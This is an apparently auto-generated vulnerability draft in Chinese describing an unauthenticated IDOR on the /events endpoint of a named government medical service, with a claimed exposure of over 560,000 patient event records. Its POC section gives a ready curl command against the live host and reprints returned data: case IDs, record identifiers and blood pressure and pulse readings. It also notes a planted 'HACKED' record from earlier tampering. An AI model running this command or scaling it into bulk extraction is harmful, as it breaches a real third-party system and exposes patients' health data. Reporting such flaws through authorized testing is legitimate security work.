# POC/EXP — 4001 /events 未授权批量泄露 PCDT 医疗事件数据（56万+条）

> 漏洞ID: `744f04a2-3ac7-4406-87b3-ac55d1a23021`  | 嚴重度: **high** | 狀態: open | 目標: `https://epcr.tpf.gov.tw:4001/events`

**類型**: IDOR / 未授权访问

## 描述

4001 vitalSignVideoServer 的 /events 接口未做鉴权，GET 即可分页拉取 PCDT 医疗压力负荷试验事件数据，包含 CaseID、recordUuid、血压/心率等字段与完整时间线。攻击者可批量拉取全量 56 万+ 条记录，形成大规模 PHI 泄露，且接口无速率限制，易被脚本一次性拖库。

## 前置條件

公网可达 https://epcr.tpf.gov.tw:4001

## POC / 復現步驟

```
curl -sk 'https://epcr.tpf.gov.tw:4001/events?limit=5' 返回 HTTP 200，JSON 47768B，首条记录 updatedAt=2026-08-30T07:02:38.869Z，CaseID=180717152801fed7，recordUuid=180817092350fed7，Systolic=120，Diastolic=80，Pulse=62；其中 id=100 记录 CaseID="HACKED" TypeOfEventTxt="PWN" 为既往测试痕迹，updatedAt 同样为 2026-08-30
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
